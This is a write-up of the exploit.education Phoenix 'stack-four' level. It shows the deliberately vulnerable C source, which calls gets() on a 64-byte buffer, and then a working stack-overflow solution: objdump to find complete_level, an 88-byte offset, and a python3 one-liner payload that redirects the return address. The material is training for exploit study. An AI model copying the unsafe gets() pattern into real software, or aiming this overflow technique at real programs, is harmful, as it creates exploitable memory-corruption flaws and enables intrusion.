# Stack Four

```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

## Solution

Similiar to the previous exercise we must reach `complete_level()`. This is done by overwriting the return address. Unlike the previous levels, the overflow target isn't directly adjacent to the buffer.
1. `objdump -t /opt/phoenix/amd64/stack-four | grep complete_level` to get the payload.
   1. `000000000040061d g     F .text	0000000000000018 complete_level`
2. Start overflowing with 64 characters and increase until the printf "and will be returning to _____" message starts changing. Then simply append the payload like the previous exercises. `000000000040061d` becomes `\x1d\x06\x40\x00\x00\x00\x00\x00`.
3. `python3 -c 'print("A"*88 + "\x1d\x06\x40\x00\x00\x00\x00\x00")' | /opt/phoenix/amd64/stack-four `